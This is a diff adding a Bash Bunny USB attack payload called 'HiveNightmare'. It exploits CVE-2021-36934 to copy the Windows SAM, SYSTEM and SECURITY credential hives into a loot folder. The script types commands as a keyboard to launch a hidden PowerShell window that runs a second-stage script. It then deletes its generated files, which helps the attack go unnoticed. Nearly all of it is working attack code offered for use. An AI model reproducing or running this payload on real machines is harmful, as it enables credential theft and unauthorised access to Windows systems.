@@ -1,0 +1,48 @@
+#!/bin/bash
+#
+# Title:         HiveNightmare
+# Description:   Leverages CVE-2021–36934 to get SAM/SYSTEM/SECURITY hives.
+# Author:        9o3
+# Twitter:       @BugBot4
+# Version:       1.0
+# Category:      Exfiltration
+# Attackmodes:   HID, Storage
+#
+# LED STATUS
+# ==========
+# SETUP.......Create stage file and loot folder
+# ATTACK......Run hidden PowerShell window that gets SAM/SYSTEM/SECURITY hives using shadow copies (CVE-2021-36934)
+# CLEANUP.....Remove generated files
+# FINISH......Finished
+#
+# OPTIONS
+# =======
+# TRIES => Number of shadow copies to try to find SAM/SYSTEM/SECURITY hives in.
+TRIES=10
+
+######## Create stage file and loot folder ########
+# Alter second stage based on settings & create loot folder if it does not yet exist. Removes previous DONE file if present.
+LED SETUP
+GET SWITCH_POSITION
+cd /root/udisk/payloads/$SWITCH_POSITION
+sed -e "s/<#TR#>/$TRIES/g" stage2.ps1 > 2
+mkdir -p /root/udisk/loot/HiveNightmare
+rm /root/udisk/DONE
+ATTACKMODE HID STORAGE
+
+######## Run hidden PowerShell window ########
+# Run hidden PowerShell window which executes the content of the stage2.ps1 file.
+LED ATTACK
+RUN WIN "powershell -w 1 -NoP iex(gc((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\\$SWITCH_POSITION\2')-Raw)"
+until [ -f /root/udisk/DONE ]
+do
+	sleep 0.2
+done
+
+######## Remove generated files ########
+# Removes the generated files and sync file system
+LED CLEANUP
+rm 2
+rm /root/udisk/DONE
+sync
+LED FINISH
